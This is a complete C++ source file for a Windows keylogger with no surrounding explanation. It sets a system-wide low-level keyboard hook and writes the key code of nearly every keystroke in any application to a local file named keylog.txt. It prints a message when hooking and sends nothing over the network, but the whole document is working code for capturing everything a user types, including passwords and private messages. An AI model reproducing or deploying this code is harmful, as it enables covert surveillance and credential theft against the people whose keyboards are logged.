#include <iostream>
#include <stdio.h>
#include <fstream>
#include <Windows.h>
using namespace std;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
HHOOK kbh;
ofstream textfile;
char keypressed;

LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam){
		
		PKBDLLHOOKSTRUCT keypress = (PKBDLLHOOKSTRUCT)lParam;


		if (code == HC_ACTION && wParam == WM_KEYDOWN){
			if (keypress->vkCode != VK_RETURN){
				keypressed = keypress->vkCode;
				textfile << keypressed;
			}
		}

		return CallNextHookEx(kbh, code, wParam, lParam);
}

int main (){
	
	textfile.open("keylog.txt", ios::out | ios::trunc);

	printf("Hooking the keyboard...\n");

	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
	kbh = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);

	MSG msg{ 0 };
	//a very long loop
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	
	UnhookWindowsHookEx(kbh);

	textfile.close();

	return 0;
}